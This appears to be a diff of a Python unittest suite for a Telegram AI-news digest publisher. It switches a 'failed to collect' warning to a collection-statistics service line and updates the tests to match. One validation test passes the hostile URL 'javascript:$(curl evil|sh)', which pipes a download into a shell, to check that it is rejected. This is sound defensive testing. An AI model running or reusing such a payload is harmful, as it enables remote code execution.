@@ -66,7 +66,7 @@ OZHIDAEMYE_ZAPROSY = [
         '1. <a href="https://github.com/anthropics/claude-code/issues/4321">Моды в Claude Code: команда для '
         "своей панели</a> (GitHub Claude Code) · скоро"},
     {"chat_id": KANAL, "parse_mode": "HTML", "link_preview_options": {"is_disabled": True},
-     "text": "⚠️ Не удалось собрать: посты X, обновления OpenAI API"},
+     "text": "ℹ️ Сбор: источники 1 из 3 (не ответили: обновления OpenAI API, Techmeme) · X 2 из 4 (не ответили: @gdb, @AT_T) · найдено 11, новых 10, в выпуске 8"},
 ]
 
 VYPUSK_DENGI_X = OBRAZCY / "vypusk-dengi-x.json"
@@ -77,7 +77,8 @@ OZHIDAEMYE_ZAPROSY_DENGI_X = [
         "раунд на 40 млрд долларов</a>\n"
         '2. <a href="https://www.techmeme.com/261110/p12">Mistral привлекла раунд на 2 млрд евро</a> (Techmeme)'},
     {"chat_id": KANAL, "parse_mode": "HTML", "link_preview_options": {"is_disabled": True},
-     "text": "⚠️ Не удалось собрать: посты X, обновления OpenAI API"},
+     "text": "ℹ️ Сбор: источники 1 из 3 (не ответили: обновления OpenAI API, Techmeme) · "
+             "X 2 из 4 (не ответили: @gdb, @AT_T) · найдено 11, новых 10, в выпуске 2"},
 ]
 
 NASTROJKI = OBRAZCY / "istochniki.json"
@@ -133,11 +134,12 @@ def github(n=1, **pole) -> dict:
 class Sborka(unittest.TestCase):
     def setUp(self):
         s_nastrojkami(self)
-        self.s = publikaciya.soobshcheniya(obrazec_vypuska(), ["X", "OpenAI API", "X"])
+        self.s = publikaciya.soobshcheniya(obrazec_vypuska())
+        self.s.append(publikaciya.soobshchenie_sbora(json.loads(PROGON.read_text(encoding="utf-8")), self.s))
 
     def test_poryadok_r49(self):
         self.assertEqual([s["vid"] for s in self.s],
-                         ["krupnye", "krupnye", "sayty", "x", "dengi", "github", "ne_otvetili"])
+                         ["krupnye", "krupnye", "sayty", "x", "dengi", "github", "sbor"])
 
     def test_zaprosy_literalami(self):
         self.assertEqual([publikaciya.zapros(s) for s in self.s], OZHIDAEMYE_ZAPROSY)
@@ -152,7 +154,7 @@ class Sborka(unittest.TestCase):
         self.assertTrue(self.s[1]["tekst"].startswith(
             '⭐ набирает обороты\n<b><a href="https://openai.com/index/codex-for-everyone/">'))
         self.assertNotIn("набирает обороты", self.s[0]["tekst"])
-        s = publikaciya.soobshcheniya({"krupnye": [krupnaya(zagolovok="Z", url="https://a.b/", oboroty=True)]}, [])
+        s = publikaciya.soobshcheniya({"krupnye": [krupnaya(zagolovok="Z", url="https://a.b/", oboroty=True)]})
         self.assertEqual(s[0]["tekst"], '⭐ набирает обороты\n<b><a href="https://a.b/">Z</a></b>\n\n'
                                         "Раз.\n\nДва.\n\nТри.\n\nЧетыре.\n\nПять.")
         self.assertEqual(self.s[1]["punkty"], [{"zagolovok": "OpenAI открыла Codex для всех тарифов",
@@ -160,20 +162,20 @@ class Sborka(unittest.TestCase):
                                                 "vid": "krupnaya", "oboroty": True}])
 
     def test_zvezda_v_dengah_i_x_tolko_po_priznaku(self):
-        s = publikaciya.soobshcheniya({"dengi": [sayt(1, istochnik="Techmeme", zvezda=True), sayt(2)]}, [])
+        s = publikaciya.soobshcheniya({"dengi": [sayt(1, istochnik="Techmeme", zvezda=True), sayt(2)]})
         self.assertEqual(s[0]["tekst"], "💰 Деньги и сделки\n"
                                         '1. ⭐ <a href="https://b/1">Строка 1</a> (Techmeme)\n'
                                         '2. <a href="https://b/2">Строка 2</a> (Cursor)')
-        s = publikaciya.soobshcheniya({"x": [iks(1)]}, [])
+        s = publikaciya.soobshcheniya({"x": [iks(1)]})
         self.assertEqual(s[0]["tekst"], "𝕏 Посты в X\n"
                                         '1. Сэм Альтман, OpenAI: <a href="https://x.com/sama/status/1">Пост 1</a>')
 
     def test_dengi_iz_x_kak_stroka_x(self):
-        s = publikaciya.soobshcheniya({"dengi": [dengi_x(1)]}, [])
+        s = publikaciya.soobshcheniya({"dengi": [dengi_x(1)]})
         self.assertEqual(s[0]["tekst"], "💰 Деньги и сделки\n"
                                         '1. Сэм Альтман, OpenAI: <a href="https://x.com/sama/status/1">Сделка 1</a>')
         s = publikaciya.soobshcheniya({"dengi": [sayt(1, istochnik="Techmeme"),
-                                                 dengi_x(2, zvezda=True, zagolovok="Раунд <A> & B")]}, [])
+                                                 dengi_x(2, zvezda=True, zagolovok="Раунд <A> & B")]})
         self.assertEqual(s[0]["tekst"], "💰 Деньги и сделки\n"
                                         '1. <a href="https://b/1">Строка 1</a> (Techmeme)\n'
                                         '2. ⭐ Сэм Альтман, OpenAI: <a href="https://x.com/sama/status/2">Раунд '
@@ -195,30 +197,16 @@ class Sborka(unittest.TestCase):
                 (dengi_x(akkaunt=None), "список денег и сделок, пункт 1: нет поля akkaunt")):
             with self.subTest(plohoy=plohoy):
                 with self.assertRaises(publikaciya.OtkazVypuska) as e:
-                    publikaciya.soobshcheniya({"dengi": [plohoy]}, [])
+                    publikaciya.soobshcheniya({"dengi": [plohoy]})
                 self.assertEqual(str(e.exception), tekst)
         with self.assertRaises(publikaciya.OtkazVypuska) as e:
-            publikaciya.soobshcheniya({"sayty": [sayt(akkaunt="sama")]}, [])
+            publikaciya.soobshcheniya({"sayty": [sayt(akkaunt="sama")]})
         self.assertEqual(str(e.exception), "список сайтов, пункт 1: лишние поля akkaunt")
-
-    def test_ne_otvetili_ekraniruetsya(self):
-        s = publikaciya.soobshcheniya({"sayty": [sayt()]}, ["A<b>&"])
-        self.assertEqual(s[-1]["tekst"], "⚠️ Не удалось собрать: A&lt;b&gt;&amp;")
-
-    def test_ne_udalos_sobrat_nazvaniya_iz_nastroek(self):
-        s = publikaciya.soobshcheniya({"sayty": [sayt()]},
-                                      ["X", "Techmeme", "DeepMind", "Неведомый источник", "X", " OpenAI API "])
-        self.assertEqual(s[-1]["vid"], "ne_otvetili")
-        self.assertEqual(publikaciya.zapros(s[-1]), {
-            "chat_id": KANAL, "parse_mode": "HTML", "link_preview_options": {"is_disabled": True},
-            "text": "⚠️ Не удалось собрать: посты X, Techmeme, блог &lt;DeepMind&gt; &amp; Co, Неведомый источник, "
-                    "обновления OpenAI API"})
-        self.assertEqual(s[-1]["punkty"], [])
 
     def test_podpis_pervoy_strokoy_kazhdogo_spiska_u_krupnoy_net(self):
         s = publikaciya.soobshcheniya({"krupnye": [krupnaya(zagolovok="К", url="https://a/9")],
                                        "sayty": [sayt(1)], "x": [iks(2)], "dengi": [sayt(3, istochnik="Techmeme")],
-                                       "github": [github(4)]}, [])
+                                       "github": [github(4)]})
         self.assertEqual([m["tekst"] for m in s], [
             '<b><a href="https://a/9">К</a></b>\n\nРаз.\n\nДва.\n\nТри.\n\nЧетыре.\n\nПять.',
             '🌐 Блоги компаний\n1. <a href="https://b/1">Строка 1</a> (Cursor)',
@@ -241,29 +229,34 @@ class Sborka(unittest.TestCase):
                 url = f"https://x.com/{akkaunt}/status/7"
                 ssylka = f'<a href="{url}">Пост 7</a>'
                 s = publikaciya.soobshcheniya(
-                    {"x": [iks(7, akkaunt=akkaunt, url=url, idy=[url], zvezda=zvezda)]}, [])
+                    {"x": [iks(7, akkaunt=akkaunt, url=url, idy=[url], zvezda=zvezda)]})
                 self.assertEqual(s[0]["tekst"], "𝕏 Посты в X\n" + stroka + ssylka)
                 s = publikaciya.soobshcheniya(
                     {"dengi": [dengi_x(7, akkaunt=akkaunt, url=url, idy=[url], zvezda=zvezda,
-                                       zagolovok="Пост 7")]}, [])
+                                       zagolovok="Пост 7")]})
                 self.assertEqual(s[0]["tekst"], "💰 Деньги и сделки\n" + stroka + ssylka)
                 self.assertNotIn("(X)", s[0]["tekst"])
 
     def test_spravochnik_chitaetsya_tolko_kogda_nuzhen(self):
         net = nastrojki.KOREN / "temp" / "net-takogo-istochniki.json"
         with mock.patch.object(nastrojki, "FAYL_ISTOCHNIKOV", net):
-            self.assertEqual(len(publikaciya.soobshcheniya({"sayty": [sayt()], "github": [github()]}, [])), 2)
-            for vypusk, ne_otvetili in (({"x": [iks()]}, []), ({"dengi": [dengi_x()]}, []),
-                                        ({"sayty": [sayt()]}, ["X"])):
-                with self.subTest(vypusk=list(vypusk), ne_otvetili=ne_otvetili), \
-                        self.assertRaises(publikaciya.OtkazVypuska) as e:
-                    publikaciya.soobshcheniya(vypusk, ne_otvetili)
+            self.assertEqual(len(publikaciya.soobshcheniya({"sayty": [sayt()], "github": [github()]})), 2)
+            self.assertEqual(publikaciya.stroka_sbora(sbor_dannye(), 1),
+                             "ℹ️ Сбор: источники 3 из 3 · X 4 из 4 аккаунтов · найдено 2, новых 1, в выпуске 1")
+            for nazvanie, vyzov in (("x", lambda: publikaciya.soobshcheniya({"x": [iks()]})),
+                                    ("dengi", lambda: publikaciya.soobshcheniya({"dengi": [dengi_x()]})),
+                                    ("ne_otvetili", lambda: publikaciya.stroka_sbora(
+                                        sbor_dannye(ne_otvetili=["Techmeme"]), 1)),
+                                    ("bez_istochnikov", lambda: publikaciya.stroka_sbora(
+                                        {"kandidaty": []}, 1))):
+                with self.subTest(nazvanie), self.assertRaises(publikaciya.OtkazVypuska) as e:
+                    vyzov()
                 self.assertEqual(str(e.exception), "файл настроек источников не читается: FileNotFoundError")
 
     def test_limit_4096_s_podpisyu_spiska(self):
         def sayty_dlinoy(vsego: int) -> list:
             punkty = [sayt(n, zagolovok="я") for n in range(1, 11)]
-            lishnee = vsego - publikaciya.dlina(publikaciya.soobshcheniya({"sayty": punkty}, [])[0]["tekst"])
+            lishnee = vsego - publikaciya.dlina(publikaciya.soobshcheniya({"sayty": punkty})[0]["tekst"])
             for p in punkty:
                 c = min(lishnee, 1400) + 1
                 p["zagolovok"] = "&" * (c // 5) + "я" * (c % 5)
@@ -271,36 +264,36 @@ class Sborka(unittest.TestCase):
             self.assertEqual(lishnee, 0)
             return punkty
 
-        rovno = publikaciya.soobshcheniya({"sayty": sayty_dlinoy(4096)}, [])
+        rovno = publikaciya.soobshcheniya({"sayty": sayty_dlinoy(4096)})
         self.assertEqual(publikaciya.dlina(rovno[0]["tekst"]), 4096)
         self.assertTrue(rovno[0]["tekst"].startswith("🌐 Блоги компаний\n1. "))
         lishniy = sayty_dlinoy(4097)
         with self.assertRaises(publikaciya.OtkazVypuska) as e:
-            publikaciya.soobshcheniya({"sayty": lishniy}, [])
+            publikaciya.soobshcheniya({"sayty": lishniy})
         self.assertEqual(str(e.exception), "сообщение 1 (список сайтов) длиннее 4096 знаков: 4097 — сократите текст")
         stroki = "\n".join(publikaciya._stroka_spiska("sayty", n, publikaciya._punkt(
             "sayty", publikaciya.RAZDELY[1][2], p, n), {}) for n, p in enumerate(lishniy, 1))
         self.assertEqual(publikaciya.dlina(stroki), 4079)
 
-    def test_pustoy_vypusk_nichego_i_bez_ne_otvetili(self):
+    def test_pustoy_vypusk_bez_soobshcheniy_vypuska(self):
         pusto = {"krupnye": [], "sayty": [], "x": [], "dengi": [], "github": []}
-        self.assertEqual(publikaciya.soobshcheniya(pusto, ["X"]), [])
-        self.assertEqual(publikaciya.soobshcheniya({}, ["X"]), [])
+        self.assertEqual(publikaciya.soobshcheniya(pusto), [])
+        self.assertEqual(publikaciya.soobshcheniya({}), [])
 
     def test_pustoy_spisok_ne_otpravlyaetsya(self):
-        s = publikaciya.soobshcheniya({"krupnye": [], "sayty": [], "x": [iks()], "dengi": [], "github": []}, [])
+        s = publikaciya.soobshcheniya({"krupnye": [], "sayty": [], "x": [iks()], "dengi": [], "github": []})
         self.assertEqual([m["vid"] for m in s], ["x"])
-        s = publikaciya.soobshcheniya({"github": [github()]}, ["X"])
-        self.assertEqual([m["vid"] for m in s], ["github", "ne_otvetili"])
+        s = publikaciya.soobshcheniya({"github": [github()]})
+        self.assertEqual([m["vid"] for m in s], ["github"])
 
     def test_limit_4096_rovno_mozhno_bolshe_nelzya(self):
         osnova = len('<b><a href="https://a/1">З</a></b>') + 4 * len("\n\nа") + len("\n\n")
         zapas = 4096 - osnova
         rovno = publikaciya.soobshcheniya(
-            {"krupnye": [krupnaya(zagolovok="З", abzacy=["а"] * 4 + ["я" * zapas])]}, [])
+            {"krupnye": [krupnaya(zagolovok="З", abzacy=["а"] * 4 + ["я" * zapas])]})
         self.assertEqual(publikaciya.dlina(rovno[0]["tekst"]), 4096)
         with self.assertRaises(publikaciya.OtkazVypuska) as e:
-            publikaciya.soobshcheniya({"krupnye": [krupnaya(zagolovok="З", abzacy=["а"] * 4 + ["я" * (zapas + 1)])]}, [])
+            publikaciya.soobshcheniya({"krupnye": [krupnaya(zagolovok="З", abzacy=["а"] * 4 + ["я" * (zapas + 1)])]})
         self.assertIn("4096", str(e.exception))
 
     def test_limit_schitaet_razmetku_i_utf16(self):
@@ -308,7 +301,7 @@ class Sborka(unittest.TestCase):
         self.assertEqual(publikaciya.dlina("😀"), 2)
         dlinnye = [sayt(n, zagolovok="&" * 300) for n in range(1, 4)]
         with self.assertRaises(publikaciya.OtkazVypuska):
-            publikaciya.soobshcheniya({"sayty": dlinnye}, [])
+            publikaciya.soobshcheniya({"sayty": dlinnye})
 
     def test_predely_3_10_10_5(self):
         for vypusk, mozhno in (({"krupnye": [krupnaya(url=f"https://a/{n}") for n in range(3)]}, True),
@@ -321,20 +314,20 @@ class Sborka(unittest.TestCase):
                                ({"dengi": [sayt(n) for n in range(1, 7)]}, False)):
             with self.subTest(razdel=list(vypusk), punktov=len(next(iter(vypusk.values())))):
                 if mozhno:
-                    publikaciya.soobshcheniya(vypusk, [])
+                    publikaciya.soobshcheniya(vypusk)
                 else:
                     with self.assertRaises(publikaciya.OtkazVypuska):
-                        publikaciya.soobshcheniya(vypusk, [])
+                        publikaciya.soobshcheniya(vypusk)
 
     def test_abzacev_5_8(self):
         for n, mozhno in ((4, False), (5, True), (8, True), (9, False)):
             v = {"krupnye": [krupnaya(abzacy=[f"Абзац {i}." for i in range(n)])]}
             with self.subTest(abzacev=n):
                 if mozhno:
-                    publikaciya.soobshcheniya(v, [])
+                    publikaciya.soobshcheniya(v)
                 else:
                     with self.assertRaises(publikaciya.OtkazVypuska):
-                        publikaciya.soobshcheniya(v, [])
+                        publikaciya.soobshcheniya(v)
 
     def test_otkaz_po_scheme(self):
         for plohoy in ({"spisok": [sayt()]},
@@ -353,15 +346,86 @@ class Sborka(unittest.TestCase):
                        {"sayty": {}},
                        []):
             with self.subTest(plohoy=plohoy), self.assertRaises(publikaciya.OtkazVypuska):
-                publikaciya.soobshcheniya(plohoy, [])
-        publikaciya.soobshcheniya({"sayty": [sayt(zagolovok="я" * 300)]}, [])
+                publikaciya.soobshcheniya(plohoy)
+        publikaciya.soobshcheniya({"sayty": [sayt(zagolovok="я" * 300)]})
         with self.assertRaises(publikaciya.OtkazVypuska):
-            publikaciya.soobshcheniya({"sayty": [sayt()]}, "X")
+            publikaciya.stroka_sbora([], 1)
 
     def test_plohoy_adres_ne_popadaet_v_otkaz(self):
         with self.assertRaises(publikaciya.OtkazVypuska) as e:
-            publikaciya.soobshcheniya({"sayty": [sayt(url="javascript:$(curl evil|sh)")]}, [])
+            publikaciya.soobshcheniya({"sayty": [sayt(url="javascript:$(curl evil|sh)")]})
         self.assertEqual(str(e.exception), "список сайтов, пункт 1: адрес не http(s)")
+
+
+def sbor_dannye(**pole) -> dict:
+    """Файл прогона сбора публикатора для служебной строки: источники записанных настроек теста без X
+    (OpenAI API, Techmeme, DeepMind), X — 4 аккаунта, два кандидата, один новый."""
+    d = {"kandidaty": [{"id": "https://a/1", "novyy": True}, {"id": "https://a/2", "novyy": False}],
+         "ne_otvetili": [], "istochniki": ["OpenAI API", "Techmeme", "DeepMind"],
+         "iks": {"akkauntov": 4, "ne_otvetili": []}}
+    d.update(pole)
+    return d
+
+
+class StrokaSbora(unittest.TestCase):
+    """Р74: служебная строка сбора — последним сообщением каждого выпуска, и пустого тоже. Названия —
+    из записанного файла настроек теста; ожидаемое — литералами."""
+
+    def setUp(self):
+        s_nastrojkami(self)
+
+    def sbor(self, dannye: dict, vypusk: dict) -> dict:
+        s = publikaciya.soobshcheniya(vypusk)
+        return publikaciya.soobshchenie_sbora(dannye, s)
+
+    def test_vse_otvetili(self):
+        s = self.sbor(sbor_dannye(), {"krupnye": [krupnaya()], "sayty": [sayt(1), sayt(2)], "x": [iks(3)]})
+        self.assertEqual(publikaciya.zapros(s), {
+            "chat_id": KANAL, "parse_mode": "HTML", "link_preview_options": {"is_disabled": True},
+            "text": "ℹ️ Сбор: источники 3 из 3 · X 4 из 4 аккаунтов · найдено 2, новых 1, в выпуске 4"})
+        self.assertEqual((s["vid"], s["punkty"]), ("sbor", []))
+
+    def test_chast_upala(self):
+        dannye = sbor_dannye(ne_otvetili=["Techmeme"], iks={"akkauntov": 4, "ne_otvetili": ["gdb", "AT_T", "sama"]})
+        s = self.sbor(dannye, {"sayty": [sayt()]})
+        self.assertEqual(s["tekst"], "ℹ️ Сбор: источники 2 из 3 (не ответил: Techmeme) · "
+                                     "X 1 из 4 (не ответили: @gdb, @AT_T, @sama) · найдено 2, новых 1, в выпуске 1")
+        dannye = sbor_dannye(ne_otvetili=["OpenAI API", "DeepMind", "OpenAI API"],
+                             iks={"akkauntov": 4, "ne_otvetili": ["gdb"]})
+        self.assertEqual(self.sbor(dannye, {"sayty": [sayt()]})["tekst"],
+                         "ℹ️ Сбор: источники 1 из 3 (не ответили: обновления OpenAI API, блог &lt;DeepMind&gt; &amp; Co) · "
+                         "X 3 из 4 (не ответил: @gdb) · найдено 2, новых 1, в выпуске 1")
+
+    def test_pustoy_vypusk(self):
+        s = self.sbor(sbor_dannye(), {"krupnye": [], "sayty": [], "x": [], "dengi": [], "github": []})
+        self.assertEqual(s["tekst"], "ℹ️ В выпуск ничего не отобрано · источники 3 из 3 · X 4 из 4 · найдено 2, новых 1, в выпуске 0")
+        dannye = sbor_dannye(ne_otvetili=["Techmeme"], iks={"akkauntov": 4, "ne_otvetili": ["gdb"]})
+        self.assertEqual(self.sbor(dannye, {})["tekst"],
+                         "ℹ️ В выпуск ничего не отобрано · источники 2 из 3 (не ответил: Techmeme) · "
+                         "X 3 из 4 (не ответил: @gdb) · найдено 2, новых 1, в выпуске 0")
+
+    def test_x_ne_otvetil_ni_odin(self):
+        dannye = sbor_dannye(ne_otvetili=["X"], iks={"akkauntov": 4, "ne_otvetili": ["sama", "gdb", "OpenAI", "AT_T"]})
+        self.assertEqual(self.sbor(dannye, {"sayty": [sayt()]})["tekst"],
+                         "ℹ️ Сбор: источники 3 из 3 · X 0 из 4 (не ответил ни один) · найдено 2, новых 1, в выпуске 1")
+
+    def test_bez_x_v_nastroykah(self):
+        self.assertEqual(publikaciya.stroka_sbora(sbor_dannye(iks=None), 2),
+                         "ℹ️ Сбор: источники 3 из 3 · найдено 2, новых 1, в выпуске 2")
+
+    def test_staryy_fayl_progona_bez_novyh_poley(self):
+        staryy = {"kandidaty": [{"id": "https://a/1"}], "ne_otvetili": ["X", "OpenAI API"]}
+        self.assertEqual(publikaciya.stroka_sbora(staryy, 1),
+                         "ℹ️ Сбор: источники 2 из 3 (не ответил: обновления OpenAI API) · X 0 из 4 · "
+                         "найдено 1, новых 1, в выпуске 1")
+        self.assertEqual(publikaciya.stroka_sbora({"kandidaty": [], "ne_otvetili": []}, 0),
+                         "ℹ️ Новых новостей нет · источники 3 из 3 · найдено 0, новых 0")
+
+    def test_ekranirovanie(self):
+        dannye = sbor_dannye(istochniki=["A<b>&"], ne_otvetili=["A<b>&"])
+        self.assertEqual(self.sbor(dannye, {"sayty": [sayt()]})["tekst"],
+                         "ℹ️ Сбор: источники 0 из 1 (не ответил: A&lt;b&gt;&amp;) · X 4 из 4 аккаунтов · "
+                         "найдено 2, новых 1, в выпуске 1")
 
 
 class Slot(unittest.TestCase):
@@ -717,13 +781,14 @@ class Otpravka(SFaylami):
         self.assertIn("4096", err)
         self.assertFalse(self.sost.exists())
 
-    def test_pustoy_vypusk_bez_tokena_sdvigaet_period(self):
-        del os.environ[PEREMENNAYA]
+    def test_pustoy_vypusk_shlet_stroku_sbora_i_sdvigaet_period(self):
         self.svoy_vypusk({"krupnye": [], "sayty": [], "x": [], "dengi": [], "github": []})
-        kod, out, _, telegram = self.zapusk()
-        self.assertEqual(kod, 0)
-        self.assertEqual(telegram.zaprosy, [])
-        self.assertEqual(out.strip(), "выпуск пустой — ничего не отправлено")
+        kod, out, err, telegram = self.zapusk()
+        self.assertEqual(kod, 0, err)
+        self.assertEqual(telegram.tela(), [{"chat_id": KANAL, "parse_mode": "HTML", "link_preview_options": {"is_disabled": True},
+                     "text": "ℹ️ В выпуск ничего не отобрано · источники 1 из 3 (не ответили: обновления OpenAI API, Techmeme) · "
+                             "X 2 из 4 (не ответили: @gdb, @AT_T) · найдено 11, новых 10, в выпуске 0"}])
+        self.assertEqual(out.strip(), "выпуск пустой — отправлена служебная строка сбора")
         sost = sostoyanie.zagruzit(self.sost)
         self.assertEqual(sost["posledniy_sbor"], "2026-11-11T01:07:00Z")
         self.assertEqual(sost["posledniy_slot"], "2026-11-11T02:00:00Z")
@@ -733,7 +798,7 @@ class Otpravka(SFaylami):
 
 class SboromPublikatora(SFaylami):
     """У публикатора NEWSAI_PROGON — его сбор (tests/proverka/sbor-publikatora.json), а не файл прогона
-    заявки: «Не удалось собрать», конец периода и увиденное — оттуда."""
+    заявки: служебная строка сбора, конец периода и увиденное — оттуда."""
 
     def setUp(self):
         super().setUp()
@@ -741,12 +806,13 @@ class SboromPublikatora(SFaylami):
         os.environ["NEWSAI_PROGON"] = str(obrazcy / "sbor-publikatora.json")
         os.environ["NEWSAI_VYPUSK"] = str(obrazcy / "vypusk.json")
 
-    def test_ne_otvetili_i_uvidennoe_iz_sbora_publikatora(self):
+    def test_stroka_sbora_i_uvidennoe_iz_sbora_publikatora(self):
         kod, out, err, telegram = self.zapusk()
         self.assertEqual(kod, 0, err)
         self.assertEqual(telegram.tela()[-1], {"chat_id": KANAL, "parse_mode": "HTML",
                                                "link_preview_options": {"is_disabled": True},
-                                               "text": "⚠️ Не удалось собрать: обновления OpenAI API"})
+                                               "text": "ℹ️ Сбор: источники 2 из 3 (не ответил: обновления "
+                                                       "OpenAI API) · найдено 8, новых 7, в выпуске 6"})
         self.assertEqual(len(telegram.tela()), 7)
         sost = sostoyanie.zagruzit(self.sost)
         self.assertEqual(sost["posledniy_sbor"], "2026-11-11T01:15:00Z")
@@ -768,12 +834,14 @@ class SboromPublikatora(SFaylami):
         self.assertEqual(kod, 0, err)
         self.assertEqual(sostoyanie.zagruzit(self.sost)["posledniy_slot"], "2026-11-11T02:00:00Z")
 
-    def test_suhoj_ne_otvetili_iz_sbora(self):
+    def test_suhoj_stroka_sbora_iz_sbora(self):
         del os.environ[PEREMENNAYA]
         kod, out, _, _ = self.zapusk(suhoj=True)
         self.assertEqual(kod, 0)
         self.assertEqual(out.count("--- запрос "), 7)
-        self.assertIn('"text": "⚠️ Не удалось собрать: обновления OpenAI API"', out)
+        self.assertIn('--- запрос 7 из 7: sendMessage\n{\n  "chat_id": -1004434993234,\n'
+                      '  "text": "ℹ️ Сбор: источники 2 из 3 (не ответил: обновления OpenAI API) · найдено 8, новых 7, '
+                      'в выпуске 6"', out)
 
 
 class FaylSboya(SFaylami):
@@ -903,7 +971,7 @@ class IssueVUvidennyh(SFaylami):
 
         kod, out, err, telegram = self.zapusk()
         self.assertEqual(kod, 0, err)
-        self.assertEqual(out.strip(), "отправлено сообщений: 1")
+        self.assertEqual(out.strip(), "отправлено сообщений: 2")
         sost = sostoyanie.zagruzit(self.sost)
         self.assertEqual(sorted(sost["vidennye"]), [
             "https://cursor.com/changelog/2-9",
@@ -1394,8 +1462,8 @@ class OpublikovatRezhimProverki(SFaylami):
         self.rezhim("1")
         self.svoy_vypusk({"krupnye": [], "sayty": [], "x": [], "dengi": [], "github": []})
         kod, out, _, telegram = self.zapusk()
-        self.assertEqual((kod, telegram.zaprosy), (0, []))
-        self.assertEqual(out.strip(), "выпуск пустой — ничего не отправлено")
+        self.assertEqual((kod, len(telegram.zaprosy)), (0, 1))
+        self.assertEqual(out.strip(), "выпуск пустой — отправлена служебная строка сбора")
         sost = sostoyanie.zagruzit(self.sost)
         self.assertEqual((sost["posledniy_slot"], sost["posledniy_sbor"]),
                          ("2026-11-10T18:00:00Z", "2026-11-11T01:07:00Z"))
